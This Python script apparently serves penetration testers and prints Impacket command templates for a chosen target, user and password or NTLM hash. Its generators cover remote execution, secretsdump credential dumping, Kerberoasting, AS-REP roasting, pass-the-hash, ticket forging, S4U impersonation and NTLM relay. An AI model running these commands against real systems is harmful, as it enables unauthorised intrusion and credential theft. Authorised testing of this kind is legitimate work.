#!/usr/bin/env python3
"""
Impacket Command Template Generator — No save, output-only

Interactive category selection uses numbers:
  1) windows_rce
  2) smb_tools
  3) ad_kerberos
  4) kerberos_extras
  5) relay_attack
  6) rpc_tools
  7) mssql_tools
  8) ldap_tools
  9) scanning_tools
 10) all

This version does not save files and does not accept a --save flag; it only prints output.
"""
import argparse
import getpass
import sys
from datetime import datetime
from typing import List

# -------------------- Categories (expanded) --------------------------------
CATEGORIES = {
    'windows_rce': [
        'wmiexec.py', 'psexec.py', 'smbexec.py', 'atexec.py', 'dcomexec.py'
    ],
    'smb_tools': [
        'smbclient.py', 'smbpasswd.py', 'smbserver.py', 'secretsdump.py'
    ],
    'ad_kerberos': [
        'GetUserSPNs.py', 'GetTGT.py', 'GetNPUsers.py', 'ticketer.py'
    ],
    'kerberos_extras': [
        'addcomputer.py', 'getPac.py', 's4u.py'
    ],
    'relay_attack': ['ntlmrelayx.py'],
    'rpc_tools': ['rpcdump.py', 'samrdump.py', 'lookupsid.py'],
    'mssql_tools': ['mssqlclient.py'],
    'ldap_tools': ['ldapdomaindump.py', 'addcomputer.py'],
    'scanning_tools': ['sniffer.py', 'nmapAnswerMachine.py'],
    'all': []
}

# -------------------- Script applicability (target OS) ----------------------
SCRIPT_TARGET = {
    'wmiexec.py': 'windows', 'psexec.py': 'windows', 'smbexec.py': 'windows',
    'atexec.py': 'windows', 'dcomexec.py': 'windows',
    'GetUserSPNs.py': 'windows', 'GetTGT.py': 'windows',
    'GetNPUsers.py': 'windows', 'ticketer.py': 'windows',
    'addcomputer.py': 'windows', 'getPac.py': 'windows', 's4u.py': 'windows',
    'smbclient.py': 'any', 'smbpasswd.py': 'any', 'smbserver.py': 'any',
    'secretsdump.py': 'any', 'ntlmrelayx.py': 'any',
    'rpcdump.py': 'any', 'samrdump.py': 'any', 'lookupsid.py': 'any',
    'mssqlclient.py': 'any', 'ldapdomaindump.py': 'any',
    'sniffer.py': 'any', 'nmapAnswerMachine.py': 'any'
}

# -------------------- UI Colors --------------------------------------------
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# -------------------- Helpers ----------------------------------------------
def normalize_hash(raw_hash: str):
    """Return (lm, nt). If NT-only provided, lm is '' (Impacket accepts ':NT')."""
    if not raw_hash:
        return None, None
    raw = raw_hash.strip()
    if ':' in raw:
        lm, nt = raw.split(':', 1)
        lm = lm or ''
        nt = nt or ''
    else:
        lm = ''
        nt = raw
    return lm.lower(), nt.lower()

def udom(domain: str, user: str):
    return f"{domain}/{user}" if domain else user

def quote_zsh(text: str):
    if text is None:
        return text
    return "'" + text.replace("'", "'\\''") + "'"

def parse_number_range_input(raw: str) -> List[str]:
    """
    Accepts strings like '1,3,5-7' and returns list of numeric strings ['1','3','5','6','7'].
    Values are returned as strings so downstream code treats them as numeric selectors.
    """
    out = []
    for part in raw.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            try:
                a, b = part.split('-', 1)
                a = int(a); b = int(b)
                if a <= 0 or b <= 0 or b < a:
                    continue
                for i in range(a, b+1):
                    out.append(str(i))
            except Exception:
                continue
        else:
            if part.isdigit():
                out.append(part)
    # dedupe while preserving order
    seen = set(); result = []
    for x in out:
        if x not in seen:
            seen.add(x); result.append(x)
    return result

def _build_auth_cmd(tool_name: str, ip: str, domain: str, user: str, pw: str, h: str, extra_args: str = "") -> str:
    """
    Generic builder for Impacket tools using domain/user@ip format.
    Handles password, hash, and placeholder credentials.
    """
    u = udom(domain, user)
    cmd_parts = [tool_name]
    if extra_args:
        cmd_parts.append(extra_args)
    
    if pw:
        cmd_parts.append(f"{u}:{quote_zsh(pw)}@{ip}")
    elif h:
        lm, nt = normalize_hash(h)
        cmd_parts.insert(1, f"-hashes {lm}:{nt}")
        cmd_parts.append(f"{u}@{ip}")
    else:
        cmd_parts.append(f"{u}:<PASSWORD>@{ip}")
    
    return ' '.join(cmd_parts)

# -------------------- Generators for scripts --------------------------------
def gen_wmiexec(ip, domain, user, pw, h):
    return _build_auth_cmd("wmiexec.py", ip, domain, user, pw, h)

def gen_psexec(ip, domain, user, pw, h):
    return _build_auth_cmd("psexec.py", ip, domain, user, pw, h)

def gen_smbexec(ip, domain, user, pw, h):
    return _build_auth_cmd("smbexec.py", ip, domain, user, pw, h)

def gen_atexec(ip, domain, user, pw, h):
    return _build_auth_cmd("atexec.py", ip, domain, user, pw, h, "whoami")

def gen_dcomexec(ip, domain, user, pw, h):
    return _build_auth_cmd("dcomexec.py", ip, domain, user, pw, h)

def gen_smbclient(ip, domain, user, pw, h):
    return _build_auth_cmd("smbclient.py", ip, domain, user, pw, h)

def gen_smbpasswd(ip, domain, user, pw, h):
    return f"smbpasswd.py {ip} {user}"

def gen_smbserver(ip, domain, user, pw, h):
    return "smbserver.py share /tmp/share"

# ❗ FIXED: correct secretsdump syntax (no -u)
def gen_secretsdump(ip, domain, user, pw, h):
    u = udom(domain, user)

    # Password auth
    if pw:
        return f"secretsdump.py {u}:{quote_zsh(pw)}@{ip}"

    # Hash auth -> domain/user@ip -hashes LM:NT
    if h:
        lm, nt = normalize_hash(h)
        return f"secretsdump.py {u}@{ip} -hashes {lm}:{nt}"

    return f"secretsdump.py {u}:<PASSWORD>@{ip}"

# ❗ FIXED: correct GetUserSPNs usage (target param must be last)
def gen_getuserspns(ip, domain, user, pw, h):
    u = udom(domain, user)

    if pw:
        return f"GetUserSPNs.py -request -dc-ip {ip} {u}:{quote_zsh(pw)}"

    if h:
        lm, nt = normalize_hash(h)
        return f"GetUserSPNs.py -request -dc-ip {ip} -hashes {lm}:{nt} {u}"

    return f"GetUserSPNs.py -request -dc-ip {ip} {u}:<PASSWORD>"

def gen_gettgt(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"GetTGT.py {u}:{quote_zsh(pw)}"
    if h:
        lm, nt = normalize_hash(h)
        return f"GetTGT.py -hashes {lm}:{nt} {u}"
    return f"GetTGT.py {u}:<PASSWORD>"

def gen_getnp(ip, domain, user=None, pw=None, h=None, usersfile: str = 'users.txt'):
    """Build GetNPUsers command.

    Priority:
    1. If credentials (pw or h) provided with user: use domain/user[:pass] or -hashes form
    2. If credentials (pw or h) provided without user: use domain[:pass] or -hashes form
    3. Otherwise: domain-wide enumeration with -usersfile (ignores user param)
    """
    # defensive cleanup: user may pass a trailing slash (e.g. 'fusion.corp/') which
    # becomes an invalid Kerberos principal when passed straight through. Strip
    # trailing slashes and surrounding whitespace.
    domain_arg = (domain or '<DOMAIN>').strip().rstrip('/')

    # If we have credentials (password or hash) use the domain/user[:pass] or -hashes form
    if pw:
        u = udom(domain_arg, user)
        if ip:
            return f"GetNPUsers.py {u}:{quote_zsh(pw)} -dc-ip {ip}"
        return f"GetNPUsers.py {u}:{quote_zsh(pw)}"

    if h:
        lm, nt = normalize_hash(h)
        u = udom(domain_arg, user)
        if ip:
            return f"GetNPUsers.py {u} -hashes {lm}:{nt} -dc-ip {ip}"
        return f"GetNPUsers.py {u} -hashes {lm}:{nt}"

    # No credentials: use domain-wide enumeration with usersfile (ignore user param)
    # This is the preferred/default mode for GetNPUsers
    if ip:
        return f"GetNPUsers.py {domain_arg}/ -dc-ip {ip} -usersfile {usersfile}"
    return f"GetNPUsers.py {domain_arg}/ -usersfile {usersfile}"

def gen_ticketer(user, h):
    if h:
        lm, nt = normalize_hash(h)
        return f"ticketer.py -nthash {nt} {user}"
    return f"ticketer.py -nthash <NTHASH> {user}"

def gen_getpac(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"getPac.py {u}:{quote_zsh(pw)}"
    if h:
        lm, nt = normalize_hash(h)
        return f"getPac.py -hashes {lm}:{nt} {u}"
    return f"getPac.py {u}:<PASSWORD>"

def gen_s4u(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"s4u.py -impersonate admin {u}:{quote_zsh(pw)}"
    if h:
        lm, nt = normalize_hash(h)
        return f"s4u.py -impersonate admin -hashes {lm}:{nt} {u}"
    return f"s4u.py -impersonate admin {u}:<PASSWORD>"

def gen_ntlmrelay():
    return "ntlmrelayx.py -tf targets.txt -c whoami"

# RPC / SAMR / SID
def gen_rpcdump(ip, domain=None, user=None, pw=None, h=None):
    return f"rpcdump.py {ip}"

def gen_samrdump(ip, domain=None, user=None, pw=None, h=None):
    return f"samrdump.py {ip}"

def gen_lookupsid(ip, domain=None, user=None, pw=None, h=None):
    return f"lookupsid.py {ip}"

# MSSQL
def gen_mssqlclient(ip, domain, user, pw, h):
    return _build_auth_cmd("mssqlclient.py", ip, domain, user, pw, h)

# LDAP / enumeration (examples)
def gen_ldapdomaindump(ip, domain, user, pw, h):
    return f"ldapdomaindump.py -u {udom(domain,user)} -p '<PASSWORD>' {ip}"

def gen_addcomputer(ip, domain, user, pw, h):
    return f"addcomputer.py {udom(domain,user)} {ip}  # verify syntax"

# Scanning / sniffing placeholders
def gen_sniffer(ip=None):
    return "sniffer.py"

def gen_nmapAnswerMachine(ip=None):
    return "nmapAnswerMachine.py"

# -------------------- Builder ----------------------------------------------
def expand_all_categories():
    all_scripts = []
    for k, v in CATEGORIES.items():
        if k == 'all':
            continue
        all_scripts.extend(v)
    # preserve order + dedupe
    seen = set(); result = []
    for s in all_scripts:
        if s not in seen:
            seen.add(s); result.append(s)
    return result

GENERATORS = {
    'wmiexec.py': gen_wmiexec,
    'psexec.py': gen_psexec,
    'smbexec.py': gen_smbexec,
    'atexec.py': gen_atexec,
    'dcomexec.py': gen_dcomexec,
    'smbclient.py': gen_smbclient,
    'smbpasswd.py': gen_smbpasswd,
    'smbserver.py': gen_smbserver,
    'secretsdump.py': gen_secretsdump,
    'GetUserSPNs.py': gen_getuserspns,
    'GetTGT.py': gen_gettgt,
    'GetNPUsers.py': gen_getnp,
    'ticketer.py': lambda ip, domain, user, pw, h: gen_ticketer(user, h),
    'getPac.py': gen_getpac,
    's4u.py': gen_s4u,
    'ntlmrelayx.py': lambda ip, domain, user, pw, h: gen_ntlmrelay(),
    'rpcdump.py': gen_rpcdump,
    'samrdump.py': gen_samrdump,
    'lookupsid.py': gen_lookupsid,
    'mssqlclient.py': gen_mssqlclient,
    'ldapdomaindump.py': gen_ldapdomaindump,
    'addcomputer.py': gen_addcomputer,
    'sniffer.py': gen_sniffer,
    'nmapAnswerMachine.py': gen_nmapAnswerMachine,
}

def build_templates(ip, user, domain, pw, h, categories, target_os, usersfile: str = 'users.txt'):
    # usersfile is optional and may be forwarded to generators that accept it
    # Map interactive numeric selectors into category keys
    cat_keys = [k for k in CATEGORIES.keys() if k != 'all']
    cat_keys.append('all')

    resolved = []
    for c in categories:
        try:
            idx = int(c)
            if 1 <= idx <= len(cat_keys):
                resolved.append(cat_keys[idx - 1])
        except (ValueError, TypeError):
            # allow category names passed via CLI
            if isinstance(c, str) and c in CATEGORIES:
                resolved.append(c)

    if not resolved:
        resolved = ['all']

    if 'all' in resolved:
        scripts = expand_all_categories()
    else:
        scripts = []
        for cat in resolved:
            scripts.extend(CATEGORIES.get(cat, []))

    scripts = list(dict.fromkeys(scripts))

    output = []
    for s in scripts:
        if target_os == 'linux' and SCRIPT_TARGET.get(s) == 'windows':
            continue

        gen = GENERATORS.get(s)
        if gen:
            # try calling with expanded params including usersfile for generators that accept it
            try:
                cmd = gen(ip, domain, user, pw, h, usersfile)
            except TypeError:
                try:
                    cmd = gen(ip, domain, user, pw, h)
                except TypeError:
                    cmd = gen()
        else:
            cmd = f"# Unknown script: {s}"

        note = "  # target: Windows" if SCRIPT_TARGET.get(s) == 'windows' else "  # target: Any"
        output.append((s, cmd + note))

    return output

# -------------------- I/O / CLI -------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(description='Impacket command template generator (output-only)')
    p.add_argument('--ip', help='Target IP or hostname')
    p.add_argument('--user', help='Username')
    p.add_argument('--domain', help='Domain (optional)')
    g = p.add_mutually_exclusive_group()
    g.add_argument('--password', help='Plaintext password (careful with shell quoting)')
    g.add_argument('--hash', help='LM:NT or NT-only hash string')
    p.add_argument('--categories', help='Comma-separated category names (non-interactive). Use interactive numbers for prompt.')
    p.add_argument('--usersfile', help='Users file to use with GetNPUsers (default: users.txt)', default='users.txt')
    p.add_argument('--target-os', choices=['windows','linux','all'], default='all', help='Target OS to tailor commands for')
    return p.parse_args()

def prompt_interactive():
    print(f"{Colors.BOLD}{Colors.CYAN}Interactive Impacket template generator (zsh local shell){Colors.END}")
    ip = input(f"{Colors.BOLD}Target IP/hostname:{Colors.END} ").strip()
    while not ip:
        ip = input(f"{Colors.RED}Target IP/hostname (cannot be empty):{Colors.END} ").strip()

    user = input(f"{Colors.BOLD}Username:{Colors.END} ").strip()
    while not user:
        user = input(f"{Colors.RED}Username (cannot be empty):{Colors.END} ").strip()

    domain = input(f"{Colors.BOLD}Domain (press Enter for none):{Colors.END} ").strip() or None
    # defensive: strip accidental trailing slash from interactive input
    if domain:
        domain = domain.rstrip('/')

    # --- exact numbered list requested by user ---
    print(f"\n{Colors.YELLOW}Interactive category selection uses numbers:{Colors.END}")
    print(f"  {Colors.GREEN}1){Colors.END} windows_rce")
    print(f"  {Colors.GREEN}2){Colors.END} smb_tools")
    print(f"  {Colors.GREEN}3){Colors.END} ad_kerberos")
    print(f"  {Colors.GREEN}4){Colors.END} kerberos_extras")
    print(f"  {Colors.GREEN}5){Colors.END} relay_attack")
    print(f"  {Colors.GREEN}6){Colors.END} rpc_tools")
    print(f"  {Colors.GREEN}7){Colors.END} mssql_tools")
    print(f"  {Colors.GREEN}8){Colors.END} ldap_tools")
    print(f"  {Colors.GREEN}9){Colors.END} scanning_tools")
    print(f" {Colors.GREEN}10){Colors.END} all")
    # --- end of exact block ---

    raw = input(f"\n{Colors.BOLD}Categories (e.g. 1,3,5 or 1-4,7) (default: 10 for 'all'):{Colors.END} ").strip() or "10"
    categories = parse_number_range_input(raw)

    print(f"\n{Colors.YELLOW}Credential type:{Colors.END} {Colors.GREEN}1){Colors.END} password  {Colors.GREEN}2){Colors.END} NTLM hash  {Colors.GREEN}3){Colors.END} none")
    ch = input(f"{Colors.BOLD}Choose:{Colors.END} ").strip()
    while ch not in ('1','2','3'):
        ch = input(f"{Colors.RED}Choose 1,2 or 3:{Colors.END} ").strip()

    pw = None
    raw_hash = None
    if ch == '1':
        pw = getpass.getpass(f"{Colors.BOLD}Password:{Colors.END} ")
        while not pw:
            pw = getpass.getpass(f"{Colors.RED}Password (cannot be empty):{Colors.END} ")
    elif ch == '2':
        raw_hash = input(f"{Colors.BOLD}NTLM hash (NT or LM:NT):{Colors.END} ").strip()
        while not raw_hash:
            raw_hash = input(f"{Colors.RED}NTLM hash (cannot be empty):{Colors.END} ").strip()
        # Validate hash format
        if ':' not in raw_hash and len(raw_hash) != 32 and len(raw_hash) != 64:
            print(f"{Colors.YELLOW}⚠️  Warning: Hash format may be incorrect (expected 32 or 64 hex chars, or LM:NT){Colors.END}")
        if not all(c in '0123456789abcdefABCDEF:' for c in raw_hash):
            print(f"{Colors.YELLOW}⚠️  Warning: Hash contains non-hex characters{Colors.END}")

    print(f"\n{Colors.YELLOW}Target OS:{Colors.END} {Colors.GREEN}1){Colors.END} windows  {Colors.GREEN}2){Colors.END} linux  {Colors.GREEN}3){Colors.END} all")
    os_ch = input(f"{Colors.BOLD}Choose:{Colors.END} ").strip() or '1'
    target_os = 'windows' if os_ch == '1' else ('linux' if os_ch == '2' else 'all')

    # Prompt for usersfile (used by GetNPUsers in domain enumeration)
    usersfile = input(f"{Colors.BOLD}Users file for GetNPUsers (default users.txt):{Colors.END} ").strip() or 'users.txt'

    # interactive: no save prompt and no saving
    return ip, user, domain, pw, raw_hash, categories, target_os, usersfile

def print_output(templates, ip, user):
    print("\n" + f"{Colors.BLUE}{'=' * 70}{Colors.END}")
    header = f"🎉 {Colors.BOLD}{Colors.MAGENTA}Impacket commands generated for {user}@{ip}{Colors.END}"
    lines = [header, f"{Colors.BLUE}{'=' * 70}{Colors.END}\n"]
    for name, cmd in templates:
        lines.append(f"🛠️  {Colors.BOLD}{Colors.GREEN}Script:{Colors.END} {Colors.CYAN}{name}{Colors.END}")
        
        # Color the command itself - simple heuristic to color the executable
        parts = cmd.split(' ', 1)
        if len(parts) > 1:
            colored_cmd = f"    {Colors.YELLOW}{parts[0]}{Colors.END} {parts[1]}"
        else:
            colored_cmd = f"    {Colors.YELLOW}{cmd}{Colors.END}"
        
        lines.append(colored_cmd)
        lines.append("") # Extra spacing for ADHD readability
    output = '\n'.join(lines)
    print(output)

# -------------------- Entry point -----------------------------------------
def main():
    args = parse_args()

    # CLI non-interactive mode
    if args.ip and args.user:
        ip = args.ip
        user = args.user
        domain = args.domain
        pw = args.password
        raw_hash = args.hash
        if args.categories:
            categories = [c.strip() for c in args.categories.split(',') if c.strip()]
        else:
            categories = []
        target_os = args.target_os
        templates = build_templates(ip, user, domain, pw, raw_hash, categories, target_os, usersfile=args.usersfile)
        print_output(templates, ip, user)
        return

    # interactive mode (numbers-only categories)
    try:
        ip, user, domain, pw, raw_hash, categories, target_os, usersfile = prompt_interactive()
    except KeyboardInterrupt:
        print("\nAborted by user")
        sys.exit(1)

    templates = build_templates(ip, user, domain, pw, raw_hash, categories, target_os, usersfile=usersfile)
    print_output(templates, ip, user)

if __name__ == '__main__':
    main()
